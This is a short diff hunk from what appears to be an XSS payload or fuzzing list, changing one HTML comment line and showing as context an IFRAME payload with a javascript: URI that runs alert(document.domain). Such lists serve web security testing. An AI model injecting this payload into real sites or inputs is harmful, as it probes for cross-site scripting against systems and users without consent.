@@ -13,7 +13,7 @@ xss
 <!-- xss-Here -->
 <!-- xss-Here -->
 <!-- xss-Here -->
-<!-- xss-Here -->
+<!-- /xss-@Here() -->
 
 <IFRAME SRC="javascript:javascript:alert(document.domain);"></IFRAME>
 
